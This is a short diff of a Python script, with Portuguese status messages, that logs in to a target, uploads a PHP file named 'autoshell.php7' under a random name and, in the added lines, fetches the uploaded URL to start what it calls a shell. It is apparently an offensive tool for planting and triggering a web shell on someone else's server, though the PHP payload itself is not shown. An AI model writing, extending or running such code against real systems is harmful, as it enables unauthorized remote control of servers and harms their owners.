@@ -1,5 +1,6 @@
 from cn import Context
 from json import load
+from requests import get
 from utils import randomString
 
 cnFile = "autoshell_base.php7"
@@ -20,6 +21,9 @@ ctx.authenticate()
 
 print(" * Fazendo Upload")
 
-ctx.upload(randomString(8), 'autoshell.php7', open('autoshell.php7'))
+url = ctx.upload(randomString(8), 'autoshell.php7', open('autoshell.php7'))
+
+print(" * Ligando shell")
+get(url)
 
 
